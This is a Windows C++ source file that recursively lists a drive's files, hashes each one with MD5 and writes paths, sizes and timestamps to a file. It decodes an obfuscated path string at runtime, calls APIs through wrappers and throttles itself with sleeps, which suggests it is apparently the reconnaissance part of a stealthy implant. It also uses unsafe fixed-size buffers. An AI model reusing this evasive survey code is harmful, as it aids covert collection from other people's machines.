// publicvar.cpp: implementation of the publicvar class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "FilePublicFun.h"
#include <Wincrypt.h>
#include "WinApi.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


BOOL  QueryFileInfo(WCHAR *filename, FILETIME &ftWrite, FILETIME &ftCreate, FILETIME &ftAccess, unsigned __int64 &filesize)
{
 	if(_waccess(filename,0)!=0)
	{
		return FALSE;
	}
	
	HANDLE		hFile;
	hFile = PCreateFileW(filename, 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		NULL,
		OPEN_EXISTING, 
		0,
		NULL);
	if (hFile!=NULL && hFile!=INVALID_HANDLE_VALUE)
	{
		 if (!PGetFileTime(hFile, &ftCreate, &ftAccess, &ftWrite))
			 return FALSE;

		DWORD	lsize = -1;
		DWORD hsize=0;
		lsize = PGetFileSize(hFile, &hsize);
		filesize = hsize;
		filesize = (filesize << 32) + lsize;
		CloseHandle(hFile);
		return TRUE;
	}
	return FALSE;
}

void FileTimeToTime_t(FILETIME ft, time_t *t)  
{
	ULARGE_INTEGER ui;  
	ui.LowPart = ft.dwLowDateTime;  
	ui.HighPart = ft.dwHighDateTime;  
	
	*t = ((LONGLONG)(ui.QuadPart - 116444736000000000) / 10000000);  
}  

//实时不搜子目录
BOOL GetDirList(DIRLIST& dirlist)
{
	WCHAR searchpath[520];
	swprintf(searchpath, L"%s\\*.*", dirlist.rootdir);
	HANDLE hfindfile;
	WIN32_FIND_DATAW finddata;
	hfindfile = PFindFirstFileW(searchpath, &finddata);
	if (hfindfile != INVALID_HANDLE_VALUE)
	{
		try
		{
			int runtimes=0;
			do
			{
				int type;
				unsigned __int64 size;
				
				if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if ((finddata.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) == FILE_ATTRIBUTE_REPARSE_POINT)
					{
						continue;
					}
					// 是文件夹
					if (wcscmp(finddata.cFileName,L".")==0 || wcscmp(finddata.cFileName,L"..")==0)
						continue;
					type = 1;
					size = 0;
				}
				else
				{
					type = 0;
					size = finddata.nFileSizeHigh;
					size = (size << 32) + finddata.nFileSizeLow;
				}
				FileFILEINFO *tp;
				if (0 == (dirlist.filecount&15))
				{
					tp = new FileFILEINFO[dirlist.filecount+16];
					memcpy(tp, dirlist.filelist, dirlist.filecount*sizeof(FileFILEINFO));
					memset(tp+dirlist.filecount, 0, sizeof(FileFILEINFO)*16);
					delete[] dirlist.filelist;
					dirlist.filelist = tp;
				}
				tp = dirlist.filelist + dirlist.filecount++;
				wcsncpy(tp->filename, finddata.cFileName, MAX_PATH);
				tp->filetime = finddata.ftLastWriteTime;
				tp->createfiletime = finddata.ftCreationTime;
				tp->accesstime = finddata.ftLastAccessTime;
				tp->filesize = size;
				tp->filetype = type;
				
				runtimes++;
				if(runtimes>20)
				{
					runtimes=0;
					PSleep(1);
				}
			}while(PFindNextFileW(hfindfile, &finddata));
			
		}catch (...){
			
		}
		PFindClose(hfindfile);
	}

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//枚举直接写文件, 因为内存分配过大有可能分不出
BOOL S_GetPathStruct(FILE * fs,WCHAR * p)
{
	WCHAR TmpStrW[20];
	//c:\\windows
	if (memicmp(p, DeFileStringW(TmpStrW, 20, L"k:\\myLjJmY"), 20) == 0)
		return FALSE;

	bool bcheckmd5 = true;
	if (memicmp(p, L"C:\\Program Files", 32) == 0 || memicmp(p, L"C:\\Program Files (x86)", 44) == 0)
		bcheckmd5 = false;
	
	DIRLIST	dirlist;
	dirlist.filecount = 0;
	dirlist.filelist = NULL;
	wcsncpy(dirlist.rootdir, p, MAX_PATH);//"c:\"
	
	if (dirlist.rootdir[wcslen(p)-1] ==L'\\')
	{
		dirlist.rootdir[wcslen(p)-1]=L'\0';
	}
	
	if(GetDirList(dirlist))
	{
		PSleep(1);

		char tmpbuf[1024];
		int dirlen=0;
		
		char filename[3*MAX_PATH], filepath[3*MAX_PATH], rootdir[3*MAX_PATH];
		WCHAR wfilename[MAX_PATH];
		char md5str[33];
		Unicode2UTF_8(dirlist.rootdir, rootdir, 3*MAX_PATH-1);
		
		int runtimes=0;
		for (int i = 0; i < dirlist.filecount; i++)
		{
			time_t ltime, createtime, accesstime;
			FileTimeToTime_t(dirlist.filelist[i].filetime, &ltime);
			FileTimeToTime_t(dirlist.filelist[i].createfiletime, &createtime);
			FileTimeToTime_t(dirlist.filelist[i].accesstime, &accesstime);
			
			Unicode2UTF_8(dirlist.filelist[i].filename, filename, 3*MAX_PATH-1);
			
			int len=0;
			//时间 \t 大小 \t 类型 \t文件名
			if(dirlist.filelist[i].filetype==0)
			{
				memset(md5str, 0, 33);
				sprintf(filepath, "%s\\%s", rootdir, filename);
				
				swprintf(wfilename, L"%s\\%s", dirlist.rootdir, dirlist.filelist[i].filename);

				if (dirlist.filelist[i].filesize > SIZE1G)
					bcheckmd5 = false;

				if(bcheckmd5)
					MD5TranFile1(md5str, wfilename);
				
				len = sprintf(tmpbuf, "%s\t%s\t1\t%I64d\t%u\t%s\t%u\t%u\n",
					rootdir, filename, dirlist.filelist[i].filesize, ltime, md5str, createtime, accesstime);
			}
			else
			{
				__int64 tmpint = 0;
				len = sprintf(tmpbuf, "%s\t%s\t0\t%I64d\t%u\t\t%u\t%u\n",
					rootdir, filename, dirlist.filelist[i].filesize, ltime, createtime, accesstime);
			}
			fwrite(tmpbuf,1,len,fs);
			
			runtimes++;
			if(runtimes>20)
			{
				runtimes=0;
				PSleep(1);
			}
		}
		
		for (int ii=0;ii < dirlist.filecount; ii++)
		{
			if(dirlist.filelist[ii].filetype!=0)
			{
				WCHAR subDir[MAX_PATH];
				swprintf(subDir, L"%s\\%s",dirlist.rootdir, dirlist.filelist[ii].filename);
				S_GetPathStruct(fs,subDir);
			}
		}
	}
	
	return TRUE;
}

